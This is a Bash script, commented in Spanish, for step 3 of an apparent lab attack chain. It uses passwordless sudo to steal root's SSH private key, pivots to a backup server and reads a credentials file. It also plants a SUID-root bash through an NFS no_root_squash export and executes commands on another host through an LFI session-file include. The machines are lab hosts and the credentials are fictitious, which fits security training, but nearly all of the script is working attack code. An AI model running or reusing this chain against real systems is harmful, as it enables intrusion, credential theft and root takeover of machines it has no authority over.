#!/usr/bin/env bash
# ============================================================================
#  lab/chain/03-m2-to-m3.sh — salto 3: M2 (root) → M3 (backups)
# ----------------------------------------------------------------------------
#  Desde M2 (cuenta adminm2 con sudo sin clave):
#    · confirmar root:            sudo -n id
#    · leer la llave de root:     /root/.ssh/id_ed25519
#    · saltar a M3 como backup:   ssh -i <llave> backup@10.10.10.13
#    · leer el secreto:           /srv/storage/backups/credenciales.txt
#  Y cerrar el círculo con NFS no_root_squash: root en un cliente del export
#  escribe un binario SUID root que después se ejecuta en M1.
#
#  Uso:
#    bash lab/chain/03-m2-to-m3.sh            # imprime
#    bash lab/chain/03-m2-to-m3.sh --run      # ejecuta 1→4 y deja el SUID
#    bash lab/chain/03-m2-to-m3.sh --run --m1-mount /mnt/backups
#
#  Credenciales de laboratorio (lab/README.md §6), datos ficticios.
# ============================================================================

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_REPO_DIR="${LAB_REPO_DIR:-$(cd "$HERE/../.." && pwd)}"
LAB_ARTIFACTS="${LAB_ARTIFACTS:-$LAB_REPO_DIR/artifacts}"
LAB_LOG="${LAB_LOG:-${TMPDIR:-/tmp}/lab-chain.log}"
export LAB_REPO_DIR LAB_ARTIFACTS LAB_LOG

# shellcheck source=../common/lib.sh
. "$HERE/../common/lib.sh"

LAB_ROLE=chain
STATE="${LAB_STATE:-${TMPDIR:-/tmp}/lab-chain.env}"
if [[ -f "$STATE" ]]; then . "$STATE"; fi

RUN=0
WS_SID="${WS_SID:-}"
LFI_URL="${LFI_URL:-https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php}"

M2_USER="${M2_USER:-adminm2}"
M2_PASS="${M2_PASS:-adminm2}"
M3_SSH_USER="${M3_SSH_USER:-rony123}"
M3_SSH_PASS="${M3_SSH_PASS:-rony123}"
M3_BACKUP_USER="${M3_BACKUP_USER:-backup}"
EXPORT="${M3_EXPORT:-/srv/storage/backups}"
M2_MOUNT="${M2_MOUNT:-/mnt/bkp}"
M1_NFS_MOUNT="${M1_NFS_MOUNT:-}"
TMPKEY="${LAB_TMPKEY:-${TMPDIR:-/tmp}/id_m2_ed25519}"

usage() {
  cat <<'EOF'
Uso: bash lab/chain/03-m2-to-m3.sh [opciones]

  --run              ejecutar (def. solo imprime)
  --m1-mount RUTA    punto de montaje del export en M1 (para probar el SUID)
  -h, --help         esta ayuda
EOF
}

while (($#)); do
  case "$1" in
    --run)        RUN=1; shift ;;
    --m1-mount)   M1_NFS_MOUNT="${2:?--m1-mount necesita una ruta}"; shift 2 ;;
    --m1-mount=*) M1_NFS_MOUNT="${1#*=}"; shift ;;
    -h|--help)    usage; exit 0 ;;
    *) die "opción desconocida: $1 (ver --help)" ;;
  esac
done

need_ssh() { command -v sshpass >/dev/null 2>&1 || die "falta sshpass (lo instala lab/m6/install.sh)"; }

ssh_m2() {
  need_ssh
  sshpass -p "$M2_PASS" ssh \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "$M2_USER@$M2" "$1"
}

ssh_m3_key() {
  [[ -s "$TMPKEY" ]] || return 1
  ssh -i "$TMPKEY" -o IdentitiesOnly=yes -o BatchMode=yes \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "$M3_BACKUP_USER@$M3" "$1"
}

ssh_m3_pass() {
  need_ssh
  sshpass -p "$M3_SSH_PASS" ssh \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 \
    "$M3_SSH_USER@$M3" "$1"
}

m1_exec() {
  # Ejecuta en M1 por el sink LFI del salto 1 (como www-data).
  [[ -n "$WS_SID" ]] || return 1
  curl -sk --max-time 30 -G "$LFI_URL" \
    --data-urlencode "file=../../../../../../tmp/sess_${WS_SID}" \
    --data-urlencode "c=$1"
}

# --------------------------------------------------------------- objetivo
lab_banner
step "salto 3 · M2 (${M2}, root) → M3 (${M3}, backups)"
cat <<EOF
Objetivo: llegar a los respaldos de M3 y al secreto que abre M4/M5.

  a) root en M2 sin clave          → sudo -n id
  b) llave privada de root en M2   → /root/.ssh/id_ed25519
  c) salto a M3 como $M3_BACKUP_USER → ssh -i llave $M3_BACKUP_USER@$M3
  d) secreto                       → $EXPORT/credenciales.txt
  e) NFS no_root_squash            → SUID root creado desde M2 y ejecutado en M1

  Este es el eslabón que convierte "una BD" en "todas las máquinas".
EOF

# --------------------------------------------------------------- comandos
step "comandos exactos"
cat <<EOF
  # a) root por sudo sin contraseña
  ssh $M2_USER@$M2 'sudo -n id'

  # b) llave de root de M2 (autorizada en M3 para la cuenta $M3_BACKUP_USER)
  ssh $M2_USER@$M2 'sudo -n cat /root/.ssh/id_ed25519' > $TMPKEY
  chmod 600 $TMPKEY

  # c) M3 con la llave
  ssh -i $TMPKEY -o IdentitiesOnly=yes $M3_BACKUP_USER@$M3 'id; hostname'

  # d) el secreto de los respaldos
  ssh -i $TMPKEY $M3_BACKUP_USER@$M3 'cat $EXPORT/credenciales.txt'

  # e) NFS con no_root_squash (B4): root del cliente manda en el export
  ssh $M2_USER@$M2 'sudo -n mkdir -p $M2_MOUNT'
  ssh $M2_USER@$M2 'sudo -n mount -t nfs $M3:$EXPORT $M2_MOUNT'
  ssh $M2_USER@$M2 'sudo -n cp /bin/bash $M2_MOUNT/labroot'
  ssh $M2_USER@$M2 'sudo -n chmod 4755 $M2_MOUNT/labroot'
  # y en M1, donde el mismo export está montado:
  $M1_NFS_MOUNT/labroot -p -c id      # euid=0(root)
EOF

if (( RUN == 0 )); then
  step "modo impresión"
  printf '  Sin --run no se ejecuta nada. Para ejecutar: --run\n' >&2
  exit 0
fi

# --------------------------------------------------------------- ejecución
step "a) root en M2 (sudo -n)"
if rootid="$(ssh_m2 'id; sudo -n id' 2>/dev/null)"; then
  printf '%s\n' "$rootid"
  grep -q 'uid=0' <<<"$rootid" && ok "root en M2 confirmado" || warn "no se vio uid=0"
else
  warn "no se pudo entrar a M2 como $M2_USER (¿servicio/credenciales?)"
  exit 1
fi

step "b) llave privada de root en M2"
if ssh_m2 'sudo -n cat /root/.ssh/id_ed25519' > "$TMPKEY" 2>/dev/null && [[ -s "$TMPKEY" ]]; then
  chmod 600 "$TMPKEY"
  ok "llave guardada en $TMPKEY ($(wc -l < "$TMPKEY") líneas)"
  head -n 1 "$TMPKEY" | sed 's/\(.\{24\}\).*/\1.../'
else
  warn "no se pudo leer /root/.ssh/id_ed25519 (¿sudo sin clave?)"
  rm -f "$TMPKEY"
fi

step "c) salto a M3 como $M3_BACKUP_USER"
m3out=""
if m3out="$(ssh_m3_key 'id; hostname' 2>/dev/null)" && [[ -n "$m3out" ]]; then
  printf '%s\n' "$m3out"
  ok "sesión en M3 con la llave de M2"
else
  warn "la llave no abrió M3; se prueba la cuenta $M3_SSH_USER (sólo para no bloquear la demo)"
  if m3out="$(ssh_m3_pass 'id; hostname' 2>/dev/null)" && [[ -n "$m3out" ]]; then
    printf '%s\n' "$m3out"
    ok "sesión en M3 con $M3_SSH_USER"
  else
    warn "sin acceso a M3: revisar SSH/servicio"
  fi
fi

step "d) credenciales de los respaldos"
creds=""
if creds="$(ssh_m3_key "cat $EXPORT/credenciales.txt" 2>/dev/null)" && [[ -n "$creds" ]]; then
  printf '%s\n' "$creds"
  ok "secreto leído: credenciales de M4/M5"
else
  creds="$(ssh_m3_pass "cat $EXPORT/credenciales.txt" 2>/dev/null || true)"
  if [[ -n "$creds" ]]; then
    printf '%s\n' "$creds"
    ok "secreto leído con $M3_SSH_USER"
  else
    warn "no se pudo leer $EXPORT/credenciales.txt"
  fi
fi

step "e) NFS no_root_squash → SUID root"
# Se monta el export en M2 y se crea el SUID como root del cliente. Con
# no_root_squash el archivo queda root:root dentro del export de M3.
nfs_cmd="sudo -n mkdir -p $M2_MOUNT; \
sudo -n mount -t nfs $M3:$EXPORT $M2_MOUNT 2>/dev/null || true; \
sudo -n cp /bin/bash $M2_MOUNT/labroot; \
sudo -n chmod 4755 $M2_MOUNT/labroot; \
sudo -n ls -ln $M2_MOUNT/labroot"
if nfsout="$(ssh_m2 "$nfs_cmd" 2>/dev/null)"; then
  printf '%s\n' "$nfsout"
  if grep -q '^-rws' <<<"$nfsout"; then
    ok "SUID root creado en el export de M3"
  else
    warn "el archivo no quedó SUID (¿root_squash activo o montaje fallido?)"
  fi
else
  warn "no se pudo montar/escribir el export desde M2"
fi

# Chequeo independiente: el dueño del archivo visto desde M3.
step "verificación desde M3 (dueño root en el export)"
if lsout="$(ssh_m3_key "ls -ln $EXPORT/labroot" 2>/dev/null)" && [[ -n "$lsout" ]]; then
  printf '%s\n' "$lsout"
  grep -q '^-rws' <<<"$lsout" && ok "confirmado: -rwsr-xr-x root root" || warn "permisos distintos a -rws"
else
  warn "no se pudo verificar desde M3"
fi

if [[ -n "$M1_NFS_MOUNT" && -n "$WS_SID" ]]; then
  step "prueba del SUID en M1 ($M1_NFS_MOUNT)"
  resp="$(m1_exec "ls -ln $M1_NFS_MOUNT/labroot 2>&1; $M1_NFS_MOUNT/labroot -p -c 'id' 2>&1" || true)"
  printf '%s\n' "$resp" | tail -n 5
  grep -q 'uid=0' <<<"$resp" && ok "root en M1 por NFS + SUID" || warn "sin uid=0: revisar el punto de montaje en M1"
elif [[ -n "$M1_NFS_MOUNT" ]]; then
  warn "M1_NFS_MOUNT definido pero sin WS_SID: no hay canal de ejecución en M1"
else
  printf '\n  Ejecutar en M1 (el export debe estar montado allí):\n' >&2
  printf '    <punto-de-montaje>/labroot -p -c id     # euid=0(root)\n' >&2
  printf '  y repetir con --m1-mount RUTA para probarlo desde aquí.\n' >&2
fi

step "siguiente salto"
printf '  credenciales de M4 en %s → bash %s/04-m3-to-m4.sh\n' "$EXPORT" "$HERE" >&2
printf '  (las credenciales están en %s; no se copian al informe)\n' "$EXPORT" >&2
